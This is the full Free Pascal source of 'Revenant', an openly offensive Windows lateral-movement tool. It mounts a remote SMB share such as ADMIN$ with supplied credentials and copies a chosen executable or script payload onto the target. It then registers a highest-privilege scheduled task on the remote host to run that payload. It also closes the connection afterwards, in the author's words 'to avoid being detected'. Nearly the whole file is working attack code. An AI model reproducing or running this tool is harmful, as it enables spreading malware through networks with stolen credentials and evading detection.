{


 _______  _______           _______  _        _______  _       _________
(  ____ )(  ____ \|\     /|(  ____ \( (    /|(  ___  )( (    /|\__   __/
| (    )|| (    \/| )   ( || (    \/|  \  ( || (   ) ||  \  ( |   ) (
| (____)|| (__    | |   | || (__    |   \ | || (___) ||   \ | |   | |
|     __)|  __)   ( (   ) )|  __)   | (\ \) ||  ___  || (\ \) |   | |
| (\ (   | (       \ \_/ / | (      | | \   || (   ) || | \   |   | |
| ) \ \__| (____/\  \   /  | (____/\| )  \  || )   ( || )  \  |   | |
|/   \__/(_______/   \_/   (_______/|/    )_)|/     \||/    )_)   )_(



* Source is provided to this software because we believe users have a     *
* right to know exactly what a program is going to do before they run it. *
* This also allows you to audit the software for security holes.          *
*                                                                         *
* Source code also allows you to port Revenant to new platforms, fix bugs *
* and add new features.
* 0xsp Revenant will always be available Open Source.                  *
*                                                                         *
*                                                                         *
*  This program is distributed in the hope that it will be useful,        *
*  but WITHOUT ANY WARRANTY; without even the implied warranty of         *
*  MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.                   *
*                                                                         *
*  #Author : Lawrence Amer   @zux0x3a                                     *
*  #LINKS :  https://0xsp.com                                             *
*                                                                         *



}


program project1;

{$mode objfpc}{$H+}

uses
  {$IFDEF UNIX}{$IFDEF UseCThreads}
  cthreads,
  {$ENDIF}{$ENDIF}
  Classes, SysUtils,windows,jwawinnetwk,CustApp,TaskScheduler_TLB,activex,types,DateUtils;

 type
   TIME_OF_DAY_INFO  = record
     tod_elapsedt     : DWord;
     tod_msecs        : DWord;
     tod_hours        : DWord;
     tod_mins         : DWord;
     tod_secs         : DWord;
     tod_hunds        : DWord;
     tod_timezone     : LongInt;
     tod_tinterval    : DWord;
     tod_day          : DWord;
     tod_month        : DWord;
     tod_year         : DWord;
     tod_weekday      : DWord;
   end;
   PTIME_OF_DAY_INFO = ^TIME_OF_DAY_INFO;

   LPBYTE           = ^Byte;
   NET_API_STATUS   = DWord;



type

  { Tbadger }
  //  TQTXNetworkPath = Class(TObject)
  TRevenant = class(TCustomApplication)

  Private
    FHostName:    String;
    FRemotePath:  String;
    FUser:        String;
    FPassword:    String;
    FConnected:   Boolean;
    FOwned:       Boolean;
    FUNCData:     packed array[0..4096] of pansichar;
    FURI:         ansiString;

  protected
    procedure     ClearLastError;

    procedure DoRun; override;
  public

    constructor Create(TheOwner: TComponent); override;
    destructor Destroy; override;
    procedure WriteHelp; virtual;
    Property Active:Boolean read FConnected;
    Property HostName:String read FHostName;
    Property  NetworkPath:String read FRemotePath;

    Function  getRelativePath(aFilename:String):String;
    Function Connect(aHostName:String;
                  aNetworkPath:String;
                  const aUsername:String='';
                  const aPassword:String=''):Boolean;

    procedure eastwest(remotehost:string;auser:string;apass:string;domain:string;share:String;u_host:string;payload:string);
    procedure mapdrive;virtual;
    procedure banner; virtual;


  end;

 var
   global_driver : string;
{ Tbadger }

procedure TRevenant.DoRun;
var
  ErrorMsg: String;
begin
  // quick check parameters
  ErrorMsg:=CheckOptions('h u p d s c t', 'help');
  if ErrorMsg<>'' then begin
    ShowException(Exception.Create(ErrorMsg));
    Terminate;
    Exit;
  end;

  // parse parameters
  if HasOption('help') then begin
    WriteHelp;
    Terminate;
    Exit;
  end;

  { add your program here }

  // stop program loop

  mapdrive;
  Terminate;

end;

constructor TRevenant.Create(TheOwner: TComponent);
begin
  inherited Create(TheOwner);
  StopOnException:=True;
end;

destructor TRevenant.Destroy;
begin
  if FConnected then
  inherited Destroy;
end;


function  GetDriveList: TStringDynArray;
var
  Buff: array[0..128] of Char;
  ptr: PChar;
  Idx: Integer;
begin
  if  (GetLogicalDriveStrings(Length(Buff), Buff) = 0) then
    RaiseLastOSError;
  // There can't be more than 26 lettered drives (A..Z).
  SetLength(Result, 26);

  Idx := 0;
  ptr := @Buff;
  while StrLen(ptr) > 0 do
  begin
    Result[Idx] := ptr;
    ptr := StrEnd(ptr);
    Inc(ptr);
    Inc(Idx);
  end;
  SetLength(Result, Idx);
end;

// Converts a drive letter into the integer drive #
// required by DiskSize().
function DOSDrive( const sDrive: String ): Integer;
begin
  if (Length(sDrive) < 1) then
    Result := -1
  else
    Result := (Ord(UpCase(sDrive[1])) - 64);
end;

// Tests the status of a drive to see if it's ready
// to access.
function DriveReady(const sDrive: String): Boolean;
var
  ErrMode: Word;
begin
  ErrMode := SetErrorMode(0);
  SetErrorMode(ErrMode or SEM_FAILCRITICALERRORS);
  try
    Result := (DiskSize(DOSDrive(sDrive)) > -1);
  finally
    SetErrorMode(ErrMode);
  end;
end;



function TRevenant.Connect(aHostName, aNetworkPath: String;
         const aUsername, aPassword: String): Boolean;


Const
drivers = 10;
MyArray  : array  [1..drivers] of string = ('H','I','J','K','L','M','Z','G','I','c');


var
  mNet: TNetResource;
  mRes: Cardinal;
  mTxt: String;
  driver: string;
  mblist :Tstringlist;
  isbusy: boolean;
begin


  (* create string list *)
  mblist := Tstringlist.Create;
  for driver in MyArray do begin
   isbusy := driveready(driver);
  // end;
   if (isbusy=false) then
     mblist.Add(driver+':');

    end;

  clearLastError;
  result:=False;
  aHostName:=trim(aHostName);
  aNetworkPath:=trim(aNetworkPath);

  if length(aHostName)>0 then
  Begin


    (* Build complete network path *)
    if length(aNetworkPath)>0 then
 //   FURI:='\\' + aHostname else
    FURI:=format('\\%s\%s',[aHostName,aNetworkPath]);

    (* Initialize UNC path *)
    ZeroMemory(@FUNCData,SizeOf(FUNCData));
    Move(pointer(@FURI[1])^,pointer(@FUNCData)^,length(FURI) * SizeOf(Pansichar) );



    global_driver := trim(mblist.strings[1]);


    (* initialize network resource data *)
    ZeroMemory(@mNet,SizeOf(mNet));
    mNet.dwScope:=RESOURCE_GLOBALNET;
    mNet.dwType:=RESOURCETYPE_DISK;
    mNet.dwDisplayType:=RESOURCEDISPLAYTYPE_SHARE;
    mNet.dwUsage:=RESOURCEUSAGE_CONNECTABLE;
    mNet.lpRemoteName:=@FUNCData;
    mNet.lpLocalName := Pchar(global_driver);  // choose available driver to mount
    writeln(mNet.lpLocalName);



   WNetCancelConnection(mNet.lplocalname,true);
     // Sleep(100);
   sleep(100);


    (* Now attempt to connect the sucker *)
    mRes:=WNetAddConnection2(mNet,
          pchar(aPassword),
          pchar(aUserName),CONNECT_TEMPORARY);
    if mRes<>NO_ERROR then
    Begin
      ZeroMemory(@FUNCData,SizeOf(FUNCData));
      setLength(FURI,0);

      Case mRes of
      ERROR_ACCESS_DENIED:            mTxt:='Access_denied:';
      ERROR_ALREADY_ASSIGNED:         mTxt:='Already assigned:';
      ERROR_BAD_DEV_TYPE:             mTxt:='Bad device type:';
      ERROR_BAD_DEVICE:               mTxt:='Bad device:';
      ERROR_BAD_NET_NAME:             mTxt:='Bad network Name:';
      ERROR_BAD_PROFILE:              mTxt:='Bad profile:';
      ERROR_BAD_PROVIDER:             mTxt:='Bad provider:';
      ERROR_BUSY:                     mTxt:='Busy:';
      ERROR_CANCELLED:                mTxt:='Canceled:';
      ERROR_CANNOT_OPEN_PROFILE:      mTxt:='Cannot_open_profile:';
      ERROR_DEVICE_ALREADY_REMEMBERED:mTxt:='Device_already_remembered:';
      ERROR_EXTENDED_ERROR:           mTxt:='Extended error:';
      ERROR_INVALID_PASSWORD:         mTxt:='Invalid password:';
      ERROR_NO_NET_OR_BAD_PATH:       mTxt:='No_Net_or_bad_path:';
      ERROR_NO_NETWORK:               mTxt:='No_Network:';
      end;

      writeln(SysErrorMessage(mres));

    end else
    Begin
      FOwned:=True;
      FConnected:=True;
      FHostName:=aHostName;
      FUser:=aUserName;
      FPassword:=aPassword;
      FRemotePath:=aNetworkPath;
    end;
  end else


end;



procedure TRevenant.eastwest(remotehost:string;auser:string;apass:string;domain:string;share:string;u_host:string;payload:string);

var TS:ITaskService;
  rootfolder:ITaskFolder;
  taskdefinition:ITaskDefinition;
  reginfo: IRegistrationInfo;
  principal:IPrincipal;
  settings:ITaskSettings;
  triggers:ITriggerCollection;
  trigger:ITrigger;
  action_:IAction;
  cmd,s_share:string;
  insec:Tdatetime;
  cust_time:string;
  i:integer;
  FS: TFormatSettings;
  custom_attck:boolean;
begin
    custom_attck := False;
    FS := DefaultFormatSettings;
    FS.DateSeparator := '/';
    FS.ShortDateFormat := 'yyyy/mm/dd';
    FS.ShortTimeFormat := 'hh:mm:ss';

   for i := 1 to paramcount do begin
  //check arg option
  if (paramstr(i)='-t') then begin
     cust_time := paramstr (i+1);

     custom_attck := true;
  end;

   end;

  cmd := 'cmd.exe /c ';

  if length(share) > 2 then
  s_share := stringreplace(share,'$','\',[rfReplaceAll, rfIgnoreCase])
  else
   s_share := stringreplace(share,'$','$',[rfReplaceAll, rfIgnoreCase]);

// fix execution of files on ADMIN$
  if (s_share='ADMIN\') OR (s_share='admin\') then
  s_share :=share
  else
  writeln('');


  if custom_attck = true then
  insec := IncSecond(StrToDateTime(cust_time,FS),5)
  else
  insec := IncSecond(Now,5);
                              //increase current time with 5 seconds
  TS:=CoTaskScheduler_.Create;
  TS.Connect(remotehost,auser,domain,apass);
 // TS.Connect(null,null,null,null);
  rootfolder:=TS.GetFolder('\');
  taskdefinition:=TS.NewTask(0);
  reginfo:=taskdefinition.RegistrationInfo;
  reginfo.Description:='Start payload';
  reginfo.Author:='0xsp.com';
  principal:=taskdefinition.Principal;
  //principal.LogonType:=3;
  Principal.LogonType:= 3;
  Principal.RunLevel := TASK_RUNLEVEL_HIGHEST;

  settings:=taskdefinition.Settings;
  settings.Enabled:=true;
  settings.StartWhenAvailable:=true;
  settings.Hidden:=False;
  Settings.Priority := 7;
  Settings.Compatibility:= $00000003;

  triggers:=taskdefinition.Triggers;
  trigger:=triggers.Create(1);
  trigger.StartBoundary:= FormatDateTime('yyyy"-"mm"-"dd"T"hh":"nn":"ss',insec);


  trigger.Id:='TimeTriggerId';
  trigger.Enabled:=true;
  action_:=taskdefinition.Actions.Create(0);
  IExecAction(action_).Path:='\\'+u_host+'\'+s_share+'\'+payload;    //here should be path of mounted driver

 rootfolder.RegisterTaskDefinition('Test Task',
         taskdefinition,TASK_CREATE_OR_UPDATE,NULL,NULL , TASK_LOGON_INTERACTIVE_TOKEN,NULL);
end;

//end;

procedure TRevenant.ClearLastError;
var
  FFailed : boolean;
  FLastError :string;
Begin
  FFailed:=False;
  setLength(FLastError,0);
end;

function setLastError(aValue:ansiString):ansistring;
var
  FLastError:string;
  FFailed : boolean;
Begin
  FLastError:=trim(aValue);
  FFailed:=Length(FLastError)>0;
end;

Function TRevenant.getRelativePath(aFilename:String):String;
Begin
  if FConnected then
  result:=FURI + aFilename else
  result:=aFilename;
end;
function FileCopy(Source, Target: string): boolean;
// Copies source to target; overwrites target.
// Caches entire file content in memory.
// Returns true if succeeded; false if failed.
var
  MemBuffer: TMemoryStream;
begin
  result := false;
  MemBuffer := TMemoryStream.Create;
  try
    MemBuffer.LoadFromFile(Source);
    MemBuffer.SaveToFile(Target);
    result := true
  except
    //swallow exception; function result is false by default
  end;
  // Clean up
  MemBuffer.Free
end;

procedure TRevenant.banner;

  var
  asci,author,site,slog:string;

begin

   asci := #10+
           '|___<________>____<____&' +#10+
           '|                      |'+#10+
           '|    0xsp Revenant     |'+#10+
           '|                      |'+#10+
           ' **____<___>____<____** '+#10;

  author := '[!] Lawrence Amer @zux0x3a';
  site :=   '[!] https://0xsp.com';
  slog :=   '[^] Move East-West .. < Revenant ';
  writeln(asci);
  writeln(author);
  writeln(site);
  writeln(slog);

end;

procedure TRevenant.mapdrive;
var
  b:boolean;
  i,ch:integer;
  host,username,password,domain,share,payload:string;
begin
  ch := 0;
  banner;
  for i := 1 to paramcount do begin
  //check arg option
  if (paramstr(i)='-h') then begin
     host := paramstr (i+1);
     inc(ch,1);
  end;
   if (paramstr(i)='-u') then begin
     username := paramstr (i+1);
     inc(ch,1);
  end;
if (paramstr(i)='-p') then  begin
    password := paramstr (i+1);
   inc(ch,1);
 end;
if (paramstr(i)='-d') then   begin
    domain := paramstr (i+1)+'\';
  inc(ch,1);
 end;
if (paramstr(i)='-s') then begin
  share := paramstr (i+1)+'$';
  inc(ch,1);
  end;
if (paramstr(i)='-c') then begin
  payload := paramstr (i+1);
  inc(ch,1);

  end;

end;

   if ( ch < 4 ) then begin       // this will check if you supplied all required args
     writehelp;
     exit
   end  else

  writeln(' ' );
  writeln('[->] Establishing Connection...');
  if length(share) > 2 then
  share := stringreplace(share,'$','',[rfReplaceAll, rfIgnoreCase])
  else
  share := stringreplace(share,'$','$',[rfReplaceAll, rfIgnoreCase]);
 // fix ADMIN$
 if (share ='ADMIN') OR (share='admin') then
 share := share+'$'
 else
 writeln('[+] hijacking ...'+share);

  Connect(host,share,domain+username,password);
  if FConnected = true then
  writeln('[+] Access Granted');
  writeln('[+] Checking permission (READ,WRITE) on Share ');

  if ( share ='admin' ) OR ( share = 'ADMIN') then
  filecopy(getcurrentdir+'\'+payload,'c:\windows\system32\'+payload)
  else
  filecopy(getcurrentdir+'\'+payload,global_driver+'\'+payload);

  //stage 3 - start lateral movment attack here
  writeln('[->] Deploying Payload east-west');
  eastwest(host,username,password,domain,share,host,payload); // that's will create a task on targeted system


  WNetCancelConnection(pchar(global_driver),true); // terminate mounted share
  // close connection to avoid being detected
  writeln('[+] Closing Active Connections');



end;
procedure TRevenant.WriteHelp;

begin
  { add your help code here }
  writeln('');
  writeln('-h',' --remote hostname or IP Address.');
  writeln('-u',' --valid username for authentication');
  writeln('-p',' --valid account password ');
  writeln('-d',' --specify Domain name FQDN');
  writeln('-s',' --share folder or driver e.g c,d,admin,user,uploads..etc');
  writeln('-c',' --select local payload as executable format or script to upload into target host');
  writeln('-t',' --[OPTIONAL] use this option in order to run the payload at specific date and time');
  writeln('Example: ', ExeName, ' -h host -u test -p "admini" -d "0xsp" -s share -c payload.[EXE,BAT,VBS]');
  writeln(' ');
  writeln('Manual Task: ', ExeName, ' -h host -u test -p "admini" -d "0xsp" -s share -c payload.[EXE,BAT,VBS] -t (2020\09\11 13:00:00)');

end;

var
  Application: TRevenant;
begin
  Application:=TRevenant.Create(nil);
  Application.Title:='Revenant';
  Application.Run;
  Application.Free;
end.

